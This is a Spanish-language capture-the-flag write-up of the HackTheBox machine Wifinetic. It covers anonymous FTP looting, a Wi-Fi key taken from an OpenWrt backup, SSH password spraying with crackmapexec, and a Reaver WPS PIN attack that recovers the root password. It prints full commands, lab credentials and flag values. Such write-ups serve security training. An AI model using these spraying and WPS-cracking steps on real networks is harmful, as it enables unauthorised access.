---
layout: post
title: "HackTheBox - Wifinetic (easy)"
categories: hackthebox/machines/medium
---

<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/4aaf2ad33bea830079d74497f8e7fefc.png">
</p>

- Wifinetic is an easy difficulty Linux machine which presents an intriguing network challenge, focusing on wireless security and network monitoring. An exposed FTP service has anonymous authentication enabled which allows us to download available files. One of the file being an OpenWRT backup which contains Wireless Network configuration that discloses an Access Point password. The contents of shadow or passwd files further disclose usernames on the server. With this information, a password reuse attack can be carried out on the SSH service, allowing us to gain a foothold as the netadmin user. Using standard tools and with the provided wireless interface in monitoring mode, we can brute force the WPS PIN for the Access Point to obtain the pre-shared key ( PSK ). The pass phrase can be reused on SSH service to obtain root access on the server.

## PortScan

- Comenzamos haciendo un escaneo de puertos abiertos y sus servicios por el protocolo **TCP**.

```bash
➜  nmap sudo nmap -sCV -p21,22,53 10.10.11.247 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-05 12:21 CST
Nmap scan report for 10.10.11.247
Host is up (0.084s latency).

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeración

- Si analizamos el escaneo vemos que tenemos puerto el puerto **21** que corresponde al servicio **FTP** el cual podemos conectarnos usando un `Anonymous FTP login` ya que esta habilitado además de que nos comparten archivos `pdf, tar y txt`.

```bash
➜  nmap ftp 10.10.11.247
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
Name (10.10.11.247:miguel): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||40843|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
226 Directory send OK.
```

- Vamos a descargarnos todo.

```bash
ftp> prompt off
Interactive mode off.
ftp> mget *
local: MigrateOpenWrt.txt remote: MigrateOpenWrt.txt
229 Entering Extended Passive Mode (|||47292|)
150 Opening BINARY mode data connection for MigrateOpenWrt.txt (4434 bytes).
100% |******************************************************************************************************|  4434       25.02 MiB/s    00:00 ETA
226 Transfer complete.
4434 bytes received in 00:00 (48.57 KiB/s)
local: ProjectGreatMigration.pdf remote: ProjectGreatMigration.pdf
229 Entering Extended Passive Mode (|||47722|)
150 Opening BINARY mode data connection for ProjectGreatMigration.pdf (2501210 bytes).
100% |******************************************************************************************************|  2442 KiB  649.31 KiB/s    00:00 ETA
226 Transfer complete.
2501210 bytes received in 00:03 (634.83 KiB/s)
local: ProjectOpenWRT.pdf remote: ProjectOpenWRT.pdf
229 Entering Extended Passive Mode (|||49450|)
150 Opening BINARY mode data connection for ProjectOpenWRT.pdf (60857 bytes).
100% |******************************************************************************************************| 60857      322.21 KiB/s    00:00 ETA
226 Transfer complete.
60857 bytes received in 00:00 (214.25 KiB/s)
local: backup-OpenWrt-2023-07-26.tar remote: backup-OpenWrt-2023-07-26.tar
229 Entering Extended Passive Mode (|||47415|)
150 Opening BINARY mode data connection for backup-OpenWrt-2023-07-26.tar (40960 bytes).
100% |******************************************************************************************************| 40960      368.09 KiB/s    00:00 ETA
226 Transfer complete.
40960 bytes received in 00:00 (205.82 KiB/s)
local: employees_wellness.pdf remote: employees_wellness.pdf
229 Entering Extended Passive Mode (|||49749|)
150 Opening BINARY mode data connection for employees_wellness.pdf (52946 bytes).
100% |******************************************************************************************************| 52946      300.96 KiB/s    00:00 ETA
226 Transfer complete.
52946 bytes received in 00:00 (200.50 KiB/s)
```

- En el **.txt** nos hablan sobre `OpenWRT` <https://www.redeszone.net/tutoriales/redes-cable/openwrt-utilidades-router/>.

```bash
➜  nmap cat MigrateOpenWrt.txt
  +-------------------------------------------------------+
  |             Replace OpenWRT with Debian                |
  +-------------------------------------------------------+
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |        Evaluate Current OpenWRT Setup        |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Plan and Prepare the Migration       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Inventory current hardware and software   |    |
  |  |   - Identify dependencies and customizations  |    |
  |  |   - Research Debian-compatible alternatives   |    |
  |  |   - Backup critical configurations and data   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |            Install Debian on Devices         |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Obtain latest Debian release              |    |
  |  |   - Check hardware compatibility              |    |
  |  |   - Flash/install Debian on each device       |    |
  |  |   - Verify successful installations           |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Set Up Networking and Services       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Configure network interfaces              |    |
  |  |   - Install and configure Wifi drivers        |    |
  |  |   - Set up DHCP, DNS, and routing             |    |
  |  |   - Install firewall and security measures    |    |
  |  |   - Set up any additional services needed     |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |           Migrate Configurations             |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Adapt OpenWRT configurations to Debian    |    |
  |  |   - Migrate custom settings and scripts       |    |
  |  |   - Ensure compatibility with new system      |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |          Test and Troubleshoot               |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Test Wifi connectivity and performance    |    |
  |  |   - Verify all services are functioning       |    |
  |  |   - Address and resolve any issues            |    |
  |  |   - Test for security issues with Reaver tool |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Monitor and Maintain                 |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Implement regular updates and patches     |    |
  |  |   - Monitor system health and performance     |    |
  |  |   - Maintain and optimize the Debian system   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  +-------------------------------------------------------+
```

- Si analizamos los `PDFs` encontramos información. 

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/1.png">
</p>

- Aquí hablan solo de un proyecto que tienen.

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/2.png">
</p>

- Aquí nos hablan sobre la migración de `OpenWRT` para su red wifi y el `pdf` es del administrador de la red Oliver Walker.

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/3.png">
</p>

- Pues bueno no encontramos nada interesante vamos analizar el `backup-OpenWrt-2023-07-26.tar`.

```bash
➜  nmap 7z x backup-OpenWrt-2023-07-26.tar

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 40960 bytes (40 KiB)

Extracting archive: backup-OpenWrt-2023-07-26.tar
--
Path = backup-OpenWrt-2023-07-26.tar
Type = tar
Physical Size = 40960
Headers Size = 19968
Code Page = UTF-8
Characteristics = GNU ASCII

Everything is Ok

Folders: 7
Files: 27
Size:       13804
Compressed: 40960
```

- Dentro del directorio `/etc` nos comparten muchos archivos.

```bash
➜  etc tree
.
├── config
│   ├── dhcp
│   ├── dropbear
│   ├── firewall
│   ├── luci
│   ├── network
│   ├── rpcd
│   ├── system
│   ├── ucitrack
│   ├── uhttpd
│   └── wireless
├── dropbear
│   ├── dropbear_ed25519_host_key
│   └── dropbear_rsa_host_key
├── group
├── hosts
├── inittab
├── luci-uploads
├── nftables.d
│   ├── 10-custom-filter-chains.nft
│   └── README
├── opkg
│   └── keys
│       └── 4d017e6f1ed5d616
├── passwd
├── profile
├── rc.local
├── shells
├── shinit
├── sysctl.conf
├── uhttpd.crt
└── uhttpd.key

7 directories, 26 files
```

- En `wireless` encontramos una `key` para al parecer un `AP` con nombre `wifinet1, wifinet0`.

```bash
➜  config cat wireless

config wifi-device 'radio0'
	option type 'mac80211'
	option path 'virtual/mac80211_hwsim/hwsim0'
	option cell_density '0'
	option channel 'auto'
	option band '2g'
	option txpower '20'

config wifi-device 'radio1'
	option type 'mac80211'
	option path 'virtual/mac80211_hwsim/hwsim1'
	option channel '36'
	option band '5g'
	option htmode 'HE80'
	option cell_density '0'

config wifi-iface 'wifinet0'
	option device 'radio0'
	option mode 'ap'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
	option wps_pushbutton '1'

config wifi-iface 'wifinet1'
	option device 'radio1'
	option mode 'sta'
	option network 'wwan'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
```

- Aquí encontramos usuarios.

```bash
➜  etc cat group
root:x:0:
daemon:x:1:
adm:x:4:
mail:x:8:
dialout:x:20:
audio:x:29:
www-data:x:33:
ftp:x:55:
users:x:100:
network:x:101:network
nogroup:x:65534:
ntp:x:123:ntp
dnsmasq:x:453:dnsmasq
logd:x:514:logd
ubus:x:81:ubus
netadmin:!:999:
```

- Como tenemos una contraseña y nombres de varios usuarios hice una lista y con `crackmapexec` vi que usuarios usan la contraseña para autenticarse por `ssh` y el usuario `netadmin` la usa.

```bash
➜  nmap cat users.txt
root
adm
mail
network
ntp
netadmin
```

```bash
➜  nmap cme ssh 10.10.11.247 -u users.txt -p 'VeRyUniUqWiFIPasswrd1!' --continue-on-success
SSH         10.10.11.247    22     10.10.11.247     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
SSH         10.10.11.247    22     10.10.11.247     [-] root:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] adm:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] mail:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] network:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ntp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [+] netadmin:VeRyUniUqWiFIPasswrd1!
```

## Shell as netadmin and user.txt

- Ahora nos podemos conectar y ver la `flag`.

```bash
➜  nmap ssh netadmin@10.10.11.247
The authenticity of host '10.10.11.247 (10.10.11.247)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.247' (ED25519) to the list of known hosts.
netadmin@10.10.11.247's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 05 Jun 2024 06:45:43 PM UTC

  System load:            0.04
  Usage of /:             70.1% of 4.76GB
  Memory usage:           12%
  Swap usage:             0%
  Processes:              228
  Users logged in:        0
  IPv4 address for eth0:  10.10.11.247
  IPv6 address for eth0:  dead:beef::250:56ff:feb9:e70f
  IPv4 address for wlan0: 192.168.1.1
  IPv4 address for wlan1: 192.168.1.23


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun  5 04:48:37 2024 from 10.10.16.6
netadmin@wifinetic:~$ export TERM=xterm
netadmin@wifinetic:~$ cat user.txt
c1b267d58451fd704217588ece6ae83b
```

## Escalada de Privilegios

- No vemos nada interesante.

```bash
netadmin@wifinetic:/$ find \-perm -4000 2>/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/snapd/snap-confine
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/bin/mount
./usr/bin/sudo
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/passwd
./usr/bin/fusermount
./usr/bin/chsh
./usr/bin/at
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/su
```

- No tenemos ningún privilegio a nivel de `sudoers`.

```bash
netadmin@wifinetic:/$ sudo -l
[sudo] password for netadmin:
Sorry, user netadmin may not run sudo on wifinetic.
```

- Podemos buscar por `capabilities` <https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities> la herramienta `reaver` <https://www.kali.org/tools/reaver/> <https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html> es utilizada para ataques wifi WPS.

>El protocolo WPS (Wi-Fi Protected Setup) es un estándar de seguridad de redes diseñado para facilitar la configuración segura de una red inalámbrica Wi-Fi. Este protocolo permite a los usuarios conectar dispositivos a una red inalámbrica de forma segura y conveniente sin tener que ingresar una contraseña larga.

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/4.png">
</p>

- Tenemos 6 interfaces.

```bash
netadmin@wifinetic:/$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:e70f  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:e70f  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:e7:0f  txqueuelen 1000  (Ethernet)
        RX packets 234991  bytes 14972570 (14.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 213051  bytes 19724677 (19.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 148254  bytes 9637744 (9.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 148254  bytes 9637744 (9.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 598684  bytes 105544453 (105.5 MB)
        RX errors 0  dropped 598623  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 20246  bytes 1987658 (1.9 MB)
        RX errors 0  dropped 2743  overruns 0  frame 0
        TX packets 23375  bytes 2791153 (2.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 5862  bytes 815386 (815.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20223  bytes 2348428 (2.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

- La que mas llama la atención es `mon0` ya que cuando tenemos una antena y la ponemos en modo monitor suele llamarse `wlan0mon`.

- Algo que podemos hacer es ver mas información acerca de las interfaces inalámbricas en el sistema.

```bash
netadmin@wifinetic:/$ iw dev
phy#2
	Interface mon0
		ifindex 7
		wdev 0x200000002
		addr 02:00:00:00:02:00
		type monitor
		txpower 20.00 dBm
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		type managed
		txpower 20.00 dBm
phy#1
	Unnamed/non-netdev interface
		wdev 0x10000056b
		addr 42:00:00:00:01:00
		type P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		type managed
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
phy#0
	Interface wlan0
		ifindex 3
		wdev 0x1
		addr 02:00:00:00:00:00
		ssid OpenWrt
		type AP
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
```

- Vemos que wlan0 tiene como nombre su `AP` `OpenWRT` que opera en el canal 1.

- Este es mas interesante ya que esta corriendo en modo `managed`.

```bash
phy#1
	Unnamed/non-netdev interface
		wdev 0x10000056b
		addr 42:00:00:00:01:00
		type P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		type managed
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
```

>type managed: La interfaz está en modo "managed", también conocido como modo "infraestructura". Este modo es utilizado en dispositivos clientes que se conectan a un punto de acceso central (como un router). El dispositivo en este modo se comunica a través de un punto de acceso.

>El "modo managed" es un tipo de configuración de red inalámbrica en la que la interfaz inalámbrica del dispositivo opera como un cliente dentro de una infraestructura de red WLAN más grande. Este es el modo típico utilizado por los dispositivos que se conectan a un router Wi-Fi. En este modo, todas las decisiones sobre cuándo y cómo transmitir datos a través de la red son administradas por el punto de acceso, y no por la interfaz inalámbrica del cliente.

- Como nos mencionan la herramienta `reaver` cuando vimos las `capabilities` si investigamos la herramienta `reaver` pues es un `WPS cracker`.

- Aquí nos explican sobre el PIN <https://outpost24.com/blog/wps-cracking-with-reaver/>.

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/5.png">
</p>

>El PIN de WPS, generalmente de 8 dígitos, está impreso en el dispositivo para facilitar el acceso. Los primeros 7 dígitos son aleatorios y el último dígito es un dígito de verificación o checksum, calculado en base a los otros dígitos para detectar errores de entrada.

>Durante el proceso de autenticación, el sistema verifica el PIN en dos etapas. Primero, verifica los primeros cuatro dígitos del PIN. Si esta primera parte es correcta, procede a verificar los siguientes tres dígitos (el octavo es el dígito de checksum).

- Para eso usaremos `Reaver`.

```bash
netadmin@wifinetic:/$ reaver

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

Required Arguments:
	-i, --interface=<wlan>          Name of the monitor-mode interface to use
	-b, --bssid=<mac>               BSSID of the target AP

Optional Arguments:
	-m, --mac=<mac>                 MAC of the host system
	-e, --essid=<ssid>              ESSID of the target AP
	-c, --channel=<channel>         Set the 802.11 channel for the interface (implies -f)
	-s, --session=<file>            Restore a previous session file
	-C, --exec=<command>            Execute the supplied command upon successful pin recovery
	-f, --fixed                     Disable channel hopping
	-5, --5ghz                      Use 5GHz 802.11 channels
	-v, --verbose                   Display non-critical warnings (-vv or -vvv for more)
	-q, --quiet                     Only display critical messages
	-h, --help                      Show help

Advanced Options:
	-p, --pin=<wps pin>             Use the specified pin (may be arbitrary string or 4/8 digit WPS pin)
	-d, --delay=<seconds>           Set the delay between pin attempts [1]
	-l, --lock-delay=<seconds>      Set the time to wait if the AP locks WPS pin attempts [60]
	-g, --max-attempts=<num>        Quit after num pin attempts
	-x, --fail-wait=<seconds>       Set the time to sleep after 10 unexpected failures [0]
	-r, --recurring-delay=<x:y>     Sleep for y seconds every x pin attempts
	-t, --timeout=<seconds>         Set the receive timeout period [10]
	-T, --m57-timeout=<seconds>     Set the M5/M7 timeout period [0.40]
	-A, --no-associate              Do not associate with the AP (association must be done by another application)
	-N, --no-nacks                  Do not send NACK messages when out of order packets are received
	-S, --dh-small                  Use small DH keys to improve crack speed
	-L, --ignore-locks              Ignore locked state reported by the target AP
	-E, --eap-terminate             Terminate each WPS session with an EAP FAIL packet
	-J, --timeout-is-nack           Treat timeout as NACK (DIR-300/320)
	-F, --ignore-fcs                Ignore frame checksum errors
	-w, --win7                      Mimic a Windows 7 registrar [False]
	-K, --pixie-dust                Run pixiedust attack
	-Z                              Run pixiedust attack

Example:
	reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv
```

- Para usarla simplemente le necesitas proporcionar el nombre de la interfaz en modo monitor y la `MAC` del `target`.

- Vamos atacar el target donde se esta corriendo el **AP**.

```bash
netadmin@wifinetic:/$ reaver -i mon0 -b 02:00:00:00:00:00 -vv

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received WSC NACK
[+] Sending WSC NACK
[!] WPS transaction failed (code: 0x04), re-trying last pin
[+] Trying pin "12345670"
[+] Sending authentication request
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received WSC NACK
[+] Sending WSC NACK
[!] WPS transaction failed (code: 0x04), re-trying last pin
[+] Trying pin "12345670"
[+] Sending authentication request
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received WSC NACK
[+] Sending WSC NACK
[!] WPS transaction failed (code: 0x04), re-trying last pin
[+] Trying pin "12345670"
[+] Sending authentication request
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 6 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```

- Vemos que tenemos el `PIN` y la `Password`.

## Shell as root and root.txt

- Si migramos al usuario `root` con la contraseña funciona.

```bash
netadmin@wifinetic:/$ su root
Password:
root@wifinetic:/# whoami
root
root@wifinetic:/#
```

- Vemos la flag.

```bash
root@wifinetic:~# cat root.txt
82e27401ce5bb1d85196562913c72da9
```
